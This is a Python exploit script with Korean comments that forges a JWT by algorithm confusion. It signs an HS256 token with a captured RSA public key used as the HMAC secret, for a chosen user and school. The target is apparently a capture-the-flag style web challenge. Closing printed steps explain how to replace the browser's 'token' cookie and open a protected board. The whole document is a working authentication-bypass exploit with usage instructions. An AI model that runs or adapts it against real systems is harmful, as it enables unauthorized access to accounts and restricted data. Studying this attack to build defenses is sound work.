import base64
import json
import hmac
import hashlib
import datetime

# ==========================================
# 탈취한 PUBLIC KEY (설정 객체에 있던 바이트 형태 그대로 유지)
# ==========================================
public_key = b"-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDAJnXwB3hbI4CQQKKNkaaI2Ilo\nKOT/8gUjYLSsFPX/PR5wNXATRX0lDs5QmwS7gdc7XSO/5NadAgPP6+3odCvpy+i9\noHm5BOnvhOkl89gZcH+qU8y29kN95MMQ6SO0yLuAXUFSenAyLFbFO9eRAg+vdrpa\nC4E8glP2DDeSmDHn4QIDAQAB\n-----END PUBLIC KEY-----"

target_username = "hacker"  # 본인의 계정명
target_school = "드림대학교"

print("="*70)
print("[DEBUG] 수동 JWT Forging (Algorithm Confusion) 스크립트 시작")
print("="*70)

print("\n[DEBUG] 1. 타겟 및 키 정보 확인")
print(f" - Username : {target_username}")
print(f" - School   : {target_school}")
print(f" - Public Key 원본 (길이: {len(public_key)}):\n{public_key.decode('utf-8')}")

def base64url_encode(data):
    """표준 Base64Url 인코딩 함수 (패딩 '=' 제거)"""
    if isinstance(data, str):
        data = data.encode('utf-8')
    encoded = base64.urlsafe_b64encode(data).replace(b'=', b'')
    print(f"   -> [Base64Url] 변환 완료: {encoded.decode('utf-8')}")
    return encoded.decode('utf-8')

print("\n[DEBUG] 2. Header 생성 (핵심: 비대칭키를 쓰지만 알고리즘은 HS256으로 조작)")
header = {"typ": "JWT", "alg": "HS256"}
header_json = json.dumps(header, separators=(',', ':'))
print(f" - Header JSON: {header_json}")
encoded_header = base64url_encode(header_json)

print("\n[DEBUG] 3. Payload 생성 (시간 정보 최신화)")
# timezone-aware 객체 사용으로 DeprecationWarning 해결
now = datetime.datetime.now(datetime.timezone.utc)
iat = int(now.timestamp())
exp = int((now + datetime.timedelta(hours=1)).timestamp())

payload = {
    "iat": iat,
    "exp": exp,
    "username": target_username,
    "school": target_school
}
payload_json = json.dumps(payload, separators=(',', ':'))
print(f" - Payload JSON: {payload_json}")
encoded_payload = base64url_encode(payload_json)

print("\n[DEBUG] 4. 서명(Signature) 수동 생성")
message = f"{encoded_header}.{encoded_payload}"
print(f" - 서명할 원본 메시지 (Header.Payload):\n   {message}")
print(" - [!] HMAC-SHA256 해시 함수에 Public Key를 시크릿 키로 강제 주입하여 서명 중...")

# 핵심: PyJWT의 방해를 받지 않고 hmac 모듈로 직접 서명
signature = hmac.new(public_key, message.encode('utf-8'), hashlib.sha256).digest()
print(f" - 생성된 서명 (Raw Bytes): {signature}")
encoded_signature = base64url_encode(signature)

print("\n[DEBUG] 5. 최종 JWT 조립")
final_jwt = f"{message}.{encoded_signature}"
print("-" * 70)
print(f"🎉 성공! 최종 위조 토큰:\n{final_jwt}")
print("-" * 70)

print("\n[!] 다음 단계 가이드:")
print(" 1. 브라우저에서 사이트 접속 후 개발자 도구(F12) 열기")
print(" 2. Application(응용 프로그램) 탭 -> Cookies 선택")
print(" 3. 'token'의 Value를 위 출력된 토큰 값으로 교체")
print(" 4. 주소창에 /s/드림대학교 입력 후 이동하여 비밀게시판 확인!")